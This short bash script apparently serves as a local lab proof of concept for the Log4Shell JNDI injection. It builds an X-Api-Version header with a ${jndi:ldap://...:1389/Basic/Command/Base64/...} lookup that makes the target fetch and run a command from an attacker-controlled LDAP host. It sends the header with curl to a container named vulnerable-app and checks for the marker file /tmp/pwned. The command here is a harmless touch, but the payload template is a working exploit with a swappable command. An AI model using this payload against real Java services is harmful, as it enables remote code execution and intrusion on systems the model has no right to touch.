#!/bin/bash

# assuming local attacker
ATTACKER_IP="$(ip -4 addr show eth0 | grep "inet\b" | awk '{print $2}' | cut -d/ -f1)"
ATTACKER_COMMAND="dG91Y2ggL3RtcC9wd25lZAo="
ATTACKER_PAYLOAD=$(echo 'X-Api-Version: \${jndi:ldap://ATTACKER_IP:1389/Basic/Command/Base64/ATTACKER_COMMAND}' | sed "s/ATTACKER_IP/${ATTACKER_IP}/" | sed "s/ATTACKER_COMMAND/${ATTACKER_COMMAND}/")

# remove attacker evidence
sudo docker exec vulnerable-app /bin/sh -c "rm -rf /tmp/pwned"

# will execute 'touch /tmp/pwned'
curl 127.0.0.1:8080 -H "${ATTACKER_PAYLOAD}"

sleep 5

# check for /tmp/pwned
sudo docker exec vulnerable-app /bin/sh -c 'if [ -f "/tmp/pwned" ]; then echo "PWNED"; else echo "FAILED"; fi'